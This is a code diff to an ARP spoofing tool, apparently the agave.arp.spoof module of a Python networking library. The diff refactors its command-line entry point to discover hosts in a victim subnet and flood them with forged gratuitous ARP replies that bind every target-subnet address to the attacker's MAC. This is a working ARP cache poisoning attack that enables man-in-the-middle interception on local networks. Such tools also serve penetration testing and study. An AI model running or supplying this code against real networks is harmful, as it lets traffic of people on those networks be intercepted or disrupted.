@@ -5,13 +5,12 @@ Usage:
 	python3 -m agave.arp.spoof <target: subnet|ip> [<victim: subnet|ip>] [-f]
 
 """
-import socket, sys
 from agave.core.helpers import Service, SocketAddress
 from agave.core.arp import ARP, OPERATION_REQUEST
-from agave.core.ethernet import Ethernet, ETHER_TYPE_ARP, MACAddress
+from agave.core.ethernet import ETHER_TYPE_ARP, MACAddress
 from agave.nic.interfaces import NetworkInterface
 from .utils import create_filter, _parse, _create_socket
-from .resolve import resolve_mac
+from .resolve import resolve
 from ipaddress import IPv4Address, IPv4Network
 from typing import Callable, Tuple
 
@@ -49,16 +48,19 @@ class Spoofer(Service):
 
 if __name__ == "__main__":
 
+	import sys
+
+
 	try:
 		# Parses arguments
-		a = IPv4Network(sys.argv[1])
-		b = None
+		target_subnet = IPv4Network(sys.argv[1])
+		victim_subnet = None
 		gratuitous = False
-		interface = NetworkInterface.get_by_host(a.network_address)
+		interface = NetworkInterface.get_by_host(target_subnet.network_address)
 		if len(sys.argv) > 2:
-			b = IPv4Network(sys.argv[2])
+			victim_subnet = IPv4Network(sys.argv[2])
 		if len(sys.argv) > 3 and sys.argv[3] == "-f":
-			if b.num_addresses > 0xff:
+			if victim_subnet.num_addresses > 0xff:
 				print("[WARNING] Subnet is too large to send gratuitous replies.")
 			else:
 				print("[INFO] Flood gratuitous is enabled.")
@@ -68,20 +70,23 @@ if __name__ == "__main__":
 		messages = []
 		if gratuitous is True:
 			addr = (interface.name, ETHER_TYPE_ARP)
-			for sender in a.hosts():
-				for target in b.hosts():
-					t_mac = resolve_mac(target, interface, sock=sock)
-					if t_mac is None:
-						print(
-							"[WARNING] Couldn't resolve MAC for {}. This host "
-							"won't be flooded with gratuitous replies.".format(target)
-						)
-					else:
-						messages.append((ARP.is_at(interface.mac.address, sender, t_mac.address, target), addr))
+			print("[INFO] Discovering hosts in the subnet...")
+			victims = list(resolve(victim_subnet, interface, sock=sock))
+			print("[INFO] Building gratuitous replies for the following hosts:")
+			print("\n".join(map(lambda x: "\t- " + str(x[1]), victims)))
+			for sender in target_subnet.hosts():
+				for victim_mac, victim_ip in victims:
+					messages.append((
+						ARP.is_at(
+							interface.mac.address, sender,
+							victim_mac.address,victim_ip
+						),
+						addr
+					))
 		# Builds service		
 		service = Spoofer(
 			sock,
-			create_filter(OPERATION_REQUEST, sender=b, target=a),
+			create_filter(OPERATION_REQUEST, sender=victim_subnet, target=target_subnet),
 			messages,
 			interval=(1 if gratuitous else 3600),
 			wait=0
@@ -93,7 +98,6 @@ if __name__ == "__main__":
 	except KeyboardInterrupt:
 		pass
 	except BaseException as e:
-		raise e
 		print(__doc__)
 		print(f"[ERROR] {e}")
 
